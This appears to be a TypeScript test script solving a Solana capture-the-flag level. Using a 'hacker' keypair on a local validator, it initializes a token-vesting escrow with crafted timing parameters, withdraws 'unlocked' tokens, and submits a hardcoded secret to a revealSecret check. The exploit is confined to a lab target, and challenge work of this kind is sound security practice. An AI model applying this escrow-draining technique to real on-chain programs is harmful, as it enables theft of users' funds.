import * as anchor from "@coral-xyz/anchor";
import * as web3 from "@solana/web3.js";
import { Level4 } from "../target/types/level_4";
import * as path from 'path';
import * as fs from 'fs';
import { createInitializeAccountInstruction, createMint, getAccount, getAccountLen, getAssociatedTokenAddress, getAssociatedTokenAddressSync, getMint, getOrCreateAssociatedTokenAccount, mintTo, TOKEN_2022_PROGRAM_ID } from "@solana/spl-token";
import { ASSOCIATED_PROGRAM_ID } from "@coral-xyz/anchor/dist/cjs/utils/token";
import { Keypair, PublicKey } from "@solana/web3.js";


const USDC = new web3.PublicKey("DLnC1zbKwRX9BjcM9ZuV8uvXaqFY5JhhGWAuY7gVtwXD")
const ESCROW = new web3.PublicKey("Gi2wpf29MLsgMZWmUEtVndB2BKX5TLyEhdWt4bBWGVrP")
const ESCROW_TOKEN_ACCOUNT = new web3.PublicKey("2Me5B53SU2z5eC5ig8oyMuWosryVyMjsXRnvxx5cVwqv")
const HACKER_TOKEN_ACCOUNT = new web3.PublicKey("RzJdKwZLe2hB8KgsE87YwXJQKTHFnAGiV4hAuC94nGa")
const SENDER = new web3.PublicKey("J6oF4UUqWEW7YW3c4CNHWZybe2oMYSpHni8Su445fkt5")
const SENDER_TOKEN_ACCOUNT = new web3.PublicKey("2CoFvgSNNV7oZcujdPV7Pe79GUdBuLkTKZvuKDZASrp8")

const SECRET = "69c5c9e5f885370d387e0d019c48f1629ab7cbfeb29e628dcebe2f78b0c2dacd"


describe("level-4", async () => {
  const provider = anchor.AnchorProvider.local("http://127.0.0.1:8899");
  anchor.setProvider(provider);

  const hacker = load_keypair('../accounts/hacker.json');
  const program = anchor.workspace.Level4 as anchor.Program<Level4>;


  let escrowPdaAuthority: any;

  before("Setup", async () => {
    await airdrop(provider.connection, hacker.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);

    [escrowPdaAuthority] = anchor.web3.PublicKey.findProgramAddressSync([anchor.utils.bytes.utf8.encode("ESCROW_PDA_AUTHORITY")], program.programId);

  });

  it("Runs the progra's ixn", async () => {
    const { escrow, escrowRecipient, escrowTokenAccount,  systemProgram, tokenProgram, associatedTokenAccount, dummyHackerATA, dummyHacker, mint, recipientATA, sender, senderATA } = await getValues();

    let slot = await provider.connection.getSlot("confirmed");
    let blockTime = await provider.connection.getBlockTime(slot);
    const AMOUNT = new anchor.BN(100);
    const END_AT = new anchor.BN(1100)
    const START_AT = new anchor.BN(1000)
    const INTERVAL = new anchor.BN(99)

    slot = await provider.connection.getSlot("confirmed");
    blockTime = await provider.connection.getBlockTime(slot);
    const output = calculateUnlockedAmount({
      amount: AMOUNT,
      startTime: START_AT,
      endTime: END_AT,
      interval: INTERVAL,
      withdrawal: new anchor.BN(0),
      now: new anchor.BN(1099)
    })
    console.log("Calculated Unlocked amout", output.toString())

    console.log(AMOUNT.sub(output).toString())

    // await logAccountField(HACKER_TOKEN_ACCOUNT, "amount", "HACKER_TOKEN_ACCOUNT before everything")

    await program.methods.initVesting(hacker.publicKey, AMOUNT, START_AT, END_AT, INTERVAL) // Adding 3234816 in the start_at for the start date(which is current time) + 4 weeks
      .accountsStrict({
        systemProgram,
        tokenProgram,
        escrow: escrow.publicKey,
        escrowTokenAccount,
        mint: USDC,
        sender: hacker.publicKey,
        senderTokenAccount: HACKER_TOKEN_ACCOUNT
      })
      .signers([hacker, escrow])
      .rpc({
        commitment: "confirmed"
      });

      
      await program.methods.withdrawUnlocked()
      .accountsStrict({
        escrow: escrow.publicKey,
        tokenProgram,
        systemProgram,
        escrowPdaAuthority,
        escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
        mint: USDC,
        recipient: hacker.publicKey,
        recipientTokenAccount: HACKER_TOKEN_ACCOUNT
      })
      .signers([hacker])
      .rpc();


      // await logAccountField(HACKER_TOKEN_ACCOUNT, "amount", "HACKER_TOKEN_ACCOUNT before everything")

  
  
  })

  it("Bug evaluation", async () => {


    const txSig = await program.methods.revealSecret(SECRET).accounts({
      hacker: hacker.publicKey,
      hackerTokenAccount: HACKER_TOKEN_ACCOUNT,
      mint: USDC
    }
    ).signers([hacker]).rpc({ commitment: "confirmed" });

    await logTxn(txSig)

  });


  async function logTxn(txSignature: any, connection: anchor.web3.Connection = provider.connection,) {
    // Confirm the transaction to ensure it's finalized
    const latestBlockhash = await connection.getLatestBlockhash();
    await connection.confirmTransaction(
      {
        signature: txSignature,
        blockhash: latestBlockhash.blockhash,
        lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
      },
      "confirmed"
    );

    // Retrieve the transaction details
    const txDetails = await connection.getTransaction(txSignature, {
      commitment: "confirmed",
      maxSupportedTransactionVersion: 0,
    });

    const logs = txDetails?.meta?.logMessages;

    if (logs) {
      console.log("Transaction Logs:");
      logs.forEach((log) => console.log(log));
    } else {
      console.log("No logs found for this transaction.");
    }
  }

  function calculateUnlockedAmount(
    {
      amount,
      startTime,
      endTime,
      interval,
      withdrawal,
      now
    }:
    { 
      amount: anchor.BN,
      startTime: anchor.BN, 
      endTime: anchor.BN,
      interval: anchor.BN,
      withdrawal: anchor.BN,
      now: anchor.BN
    }
  ): anchor.BN | null {

    if (amount.lten(0) || endTime.lte(startTime) || endTime.sub(startTime).lt(interval)) {
      throw Error("Invalid values")
    }

    // minimum from now and end time
    const time = now.lt(endTime) ? now : endTime;

    // end_at - start_at, difference of timestamps in second
    const duration = endTime.sub(startTime);

    // amount * interval / duration
    const intervalAmount = amount.mul(interval).div(duration);

    // (time - self.start_at) / self.interval + 1
    const nrIntervals = time.sub(startTime).div(interval).add(new anchor.BN(1));

    // nr_intervals * interval_amount - self.withdrawal
    return nrIntervals.mul(intervalAmount).sub(withdrawal);
  }

  async function logAccountField(
    account: web3.PublicKey,
    type: 'owner' | 'amount' | 'mint',
    message: string,
    connection: web3.Connection = provider.connection
  ) {
    const accountInfo = await getAccount(connection, account, "confirmed", TOKEN_2022_PROGRAM_ID);
    
    if (!accountInfo) {
      console.log(`${message}: Account not found`);
      return;
    }

    switch(type) {
      case 'owner':
        console.log(`${message}: ${accountInfo.owner.toString()}`);
        break;
      case 'amount':
        console.log(`${message}: ${accountInfo.amount.toString()}`);
        break;
      case 'mint':
        console.log(`${message}: ${accountInfo.mint.toString()}`);
        break;
    }
  }

  async function getValues(connection: web3.Connection = provider.connection): Promise<GetValsReturVal> {

    const escrowRecipient = web3.Keypair.generate();
    const tokenProgram = TOKEN_2022_PROGRAM_ID
    const systemProgram = web3.SystemProgram.programId;
    const AMOUNT = new anchor.BN(100)
    const sender = Keypair.generate();
    
    await airdrop(connection, sender.publicKey)

    const START_AT = new anchor.BN(0)
    const INTERVAL = new anchor.BN(10)
    const escrow = web3.Keypair.generate();
    const associatedTokenAccount = ASSOCIATED_PROGRAM_ID;
    const randomAuthority = Keypair.generate();
    const dummyHacker = Keypair.generate();

    await airdrop(connection, dummyHacker.publicKey)
    const mint = Keypair.generate();

    await createMint(
      connection,
      sender,
      randomAuthority.publicKey,
      null,
      9,
      mint,
      { commitment: "confirmed" },
      tokenProgram
    );
    const escrowTokenAccount = Keypair.generate();

    const accountLen = getAccountLen([]);
    const lamports = await connection.getMinimumBalanceForRentExemption(accountLen);

    const createAccountIx = web3.SystemProgram.createAccount({
      fromPubkey: sender.publicKey,
      newAccountPubkey: escrowTokenAccount.publicKey,
      lamports,
      space: accountLen,
      programId: TOKEN_2022_PROGRAM_ID
    });

    const initializeIx = createInitializeAccountInstruction(
      escrowTokenAccount.publicKey,
      USDC,
      hacker.publicKey, 
      TOKEN_2022_PROGRAM_ID
    );

    // Step 5: Send transaction
    const tx = new web3.Transaction().add(createAccountIx, initializeIx);
    await web3.sendAndConfirmTransaction(connection, tx, [sender, escrowTokenAccount]);

    const senderATA = await getOrCreateAssociatedTokenAccount(
      connection,
      sender,
      mint.publicKey,
      sender.publicKey,
      false,
      "confirmed",
      { commitment: "confirmed" },
      tokenProgram,
      associatedTokenAccount
    );
    const dummyHackerATA = await getOrCreateAssociatedTokenAccount(
      connection,
      dummyHacker,
      mint.publicKey,
      dummyHacker.publicKey,
      false,
      "confirmed",
      { commitment: "confirmed" },
      tokenProgram,
      associatedTokenAccount
    );

    const recipientATA = await getOrCreateAssociatedTokenAccount(
      connection,
      hacker,
      mint.publicKey,
      escrowRecipient.publicKey,
      false,
      "confirmed",
      { commitment: "confirmed" },
      tokenProgram,
      associatedTokenAccount
    );


    await mintTo(
      connection,
      hacker,
      mint.publicKey,
      senderATA.address,
      randomAuthority,
      1000 * 10 ** 9,
      [],
      { commitment: "confirmed" },
      tokenProgram
    )


    return {
      escrow,
      escrowRecipient,
      tokenProgram,
      systemProgram,
      associatedTokenAccount,
      INTERVAL,
      START_AT,
      AMOUNT,
      mint,
      escrowTokenAccount: escrowTokenAccount.publicKey,
      dummyHackerATA: dummyHackerATA.address,
      dummyHacker,
      recipientATA: recipientATA.address,
      sender,
      senderATA: senderATA.address
    }
  }
});

interface GetValsReturVal {
  escrowRecipient: Keypair,
  tokenProgram: PublicKey,
  systemProgram: PublicKey,
  AMOUNT: anchor.BN,
  START_AT: anchor.BN,
  INTERVAL: anchor.BN,
  escrow: Keypair,
  escrowTokenAccount: PublicKey,
  associatedTokenAccount: PublicKey,
  mint: Keypair,
  dummyHackerATA: PublicKey,
  dummyHacker: Keypair,
  sender: Keypair, 
  senderATA: PublicKey,
  recipientATA: PublicKey
}



async function airdrop(connection: any, address: any, amount = 1000000000) {
  await connection.confirmTransaction(await connection.requestAirdrop(address, amount), "confirmed");
}

function load_keypair(name: string)
  : anchor.web3.Keypair {
  const jsonFilePath = path.join(__dirname, name);
  let rawdata = fs.readFileSync(jsonFilePath);
  let keyData = JSON.parse(rawdata.toString());
  return anchor.web3.Keypair.fromSecretKey(new Uint8Array(keyData))

}
